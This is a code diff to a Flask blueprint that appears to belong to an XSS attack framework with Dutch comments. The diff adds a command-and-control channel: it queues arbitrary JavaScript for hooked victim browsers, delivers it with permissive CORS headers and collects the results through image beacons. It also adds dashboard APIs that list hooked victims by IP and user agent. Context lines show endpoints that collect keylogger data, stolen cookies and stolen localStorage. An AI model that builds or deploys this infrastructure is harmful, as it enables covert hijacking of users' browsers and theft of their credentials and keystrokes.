@@ -1,6 +1,7 @@
 from meuk.hacksec import *
-from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response
+from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response, jsonify
 from meuk.flask.models import *
+from meuk.flask.security import require_dashboard_access
 from datetime import date
 import hashlib
 import calendar
@@ -118,33 +119,139 @@ def xss_localstorage():
 def xss_cors():
     return '[!] Tot ziens en bedankt voor de vis.'
 
-#xxe callback
-@xxs_bp.route("/xxs/commands", methods=["GET", "POST"])
+@xxs_bp.route("/xxs/commands", methods=["GET", "OPTIONS"])
 def xss_c2():
-    '''
-    class db_xxs_commands(db.Model):
-    """Bevindingen model."""
-    __tablename__ = 'db_xxs_commands'
-    id = db.Column(db.Integer, primary_key=True)
-    host = db.Column(db.String(32), default='*')
-    opdracht = db.Column(db.Text())
-    '''
-
-
-
-    pagina = '[!] Tot ziens en bedankt voor de vis.'
-
-    return pagina, 200, {
-            'Content-Type': 'text/javascript',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
-            'Access-Control-Allow-Credentials': 'true',
-            'Access-Control-Allow-Methods': 'POST, GET',
+    if request.method == 'OPTIONS':
+        origin = request.headers.get('Origin', '*')
+        return '', 204, {
+            'Access-Control-Allow-Origin': origin,
+            'Access-Control-Allow-Methods': 'GET, OPTIONS',
             'Access-Control-Allow-Headers': 'Content-Type',
+            'Access-Control-Max-Age': '3600',
             'Vary': 'Origin',
-            'Pragma': 'no-cache',
-            'Expires': '0'
         }
+    ip = request.remote_addr
+
+    # Heartbeat: update datum van hooked record zodat we "last seen" bijhouden
+    hooked = db_xxs_hooked.query.filter_by(ip=ip).first()
+    if hooked:
+        hooked.datum = datetime.datetime.utcnow()
+        db.session.commit()
+
+    cmds = db_xxs_commands.query.filter(
+        db_xxs_commands.status == 'queued',
+        db.or_(db_xxs_commands.host == ip, db_xxs_commands.host == '*')
+    ).all()
+
+    js_parts = []
+    host = appdata.localhost
+    for cmd in cmds:
+        js_parts.append(
+            f"(function(){{try{{var _r=(function(){{{cmd.opdracht}}})();"
+            f"new Image().src='{host}/xxs/commands/result?id={cmd.id}&data='+encodeURIComponent(String(_r||'ok'));}}"
+            f"catch(_e){{new Image().src='{host}/xxs/commands/result?id={cmd.id}&data='+encodeURIComponent('ERROR: '+_e.message);}}}})();"
+        )
+        cmd.status = 'delivered'
+    db.session.commit()
+
+    pagina = '\n'.join(js_parts) if js_parts else '/* no commands */'
+
+    origin = request.headers.get('Origin', '*')
+    return pagina, 200, {
+        'Content-Type': 'text/javascript',
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Access-Control-Allow-Origin': origin,
+        'Access-Control-Allow-Methods': 'GET, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type',
+        'Vary': 'Origin',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+    }
+
+
+@xxs_bp.route("/xxs/commands/result", methods=["GET", "POST"])
+def xss_c2_result():
+    cmd_id = request.args.get('id', type=int)
+    data = request.args.get('data', '')
+    if cmd_id:
+        cmd = db.session.get(db_xxs_commands, cmd_id)
+        if cmd:
+            cmd.result = data[:50000]
+            cmd.status = 'completed'
+            db.session.commit()
+    return '', 204
+
+
+@xxs_bp.route("/api/xxs/commands", methods=["GET"])
+def api_xxs_commands_list():
+    require_dashboard_access()
+    cmds = db_xxs_commands.query.order_by(db_xxs_commands.id.desc()).all()
+    return jsonify([{
+        'id': c.id,
+        'host': c.host,
+        'opdracht': c.opdracht,
+        'status': c.status or 'queued',
+        'result': c.result,
+        'created': c.created.isoformat() if c.created else None,
+    } for c in cmds])
+
+
+@xxs_bp.route("/api/xxs/commands", methods=["POST"])
+def api_xxs_commands_create():
+    require_dashboard_access()
+    data = request.get_json(silent=True) or {}
+    host = data.get('host', '*').strip() or '*'
+    opdracht = data.get('opdracht', '').strip()
+    if not opdracht:
+        return jsonify({'error': 'opdracht is vereist'}), 400
+    cmd = db_xxs_commands(host=host, opdracht=opdracht)
+    db.session.add(cmd)
+    db.session.commit()
+    return jsonify({'id': cmd.id, 'status': cmd.status}), 201
+
+
+@xxs_bp.route("/api/xxs/commands/<int:cmd_id>", methods=["DELETE"])
+def api_xxs_commands_delete(cmd_id):
+    require_dashboard_access()
+    cmd = db.session.get(db_xxs_commands, cmd_id)
+    if not cmd:
+        return jsonify({'error': 'not found'}), 404
+    db.session.delete(cmd)
+    db.session.commit()
+    return '', 204
+
+
+@xxs_bp.route("/api/xxs/commands/clear", methods=["POST"])
+def api_xxs_commands_clear():
+    require_dashboard_access()
+    db_xxs_commands.query.filter(
+        db_xxs_commands.status.in_(['delivered', 'completed'])
+    ).delete(synchronize_session=False)
+    db.session.commit()
+    return '', 204
+
+
+@xxs_bp.route("/api/xxs/hooked", methods=["GET"])
+def api_xxs_hooked():
+    require_dashboard_access()
+    cutoff = datetime.datetime.utcnow() - datetime.timedelta(minutes=5)
+    recent = db_xxs_hooked.query.filter(
+        db_xxs_hooked.datum >= cutoff
+    ).order_by(db_xxs_hooked.datum.desc()).all()
+
+    seen = {}
+    for c in recent:
+        if c.ip not in seen:
+            seen[c.ip] = c
+    clients = list(seen.values())
+
+    return jsonify([{
+        'id': c.id,
+        'ip': c.ip,
+        'agent': c.agent,
+        'md5': c.md5,
+        'datum': c.datum.isoformat() if c.datum else None,
+    } for c in clients])
 
 
 @xxs_bp.route("/xxs/keylogger", methods=["GET", "POST"])
@@ -165,7 +272,7 @@ def xss_keylogger():
             db.session.add(bevdb)
             db.session.commit()
         else:
-            bevdb = db_xxs_keylogger.query.get(hebben.id)
+            bevdb = db.session.get(db_xxs_keylogger, hebben.id)
             bevdb.toetsen = hebben.toetsen+data
             db.session.commit()
         pagina = '[!] Tot ziens en bedankt voor de vis.'
@@ -189,15 +296,21 @@ def xss_keylogger():
 
 @xxs_bp.route("/dashboard/xxs", methods=["GET", "POST"])
 def xxs_dashboard():
-    hooked = db_xxs_hooked.query.all()
+    cutoff = datetime.datetime.utcnow() - datetime.timedelta(minutes=5)
+    recent = db_xxs_hooked.query.filter(db_xxs_hooked.datum >= cutoff).all()
+
+    # Unieke IPs: bewaar alleen de meest recente entry per IP
+    seen = {}
+    for h in recent:
+        if h.ip not in seen or (h.datum and h.datum > seen[h.ip].datum):
+            seen[h.ip] = h
+    hooked = list(seen.values())
+
     cookies = db_xxs_cookies.query.order_by('datum').all()
     keylogger = db_xxs_keylogger.query.order_by('datum').all()
     localstorage=db_xxs_localstorage.query.order_by('datum').all()
-    
-    #keysbekijken
 
-    #overzichtweergeven
-    pagina = render_template('xss_dashboard.html', cookies=cookies, keylogger=keylogger, localstorage=localstorage,  hooked=hooked, aantalhooked=len(hooked))
+    pagina = render_template('xss_dashboard.html', cookies=cookies, keylogger=keylogger, localstorage=localstorage, hooked=hooked, aantalhooked=len(hooked))
     return pagina
 
 
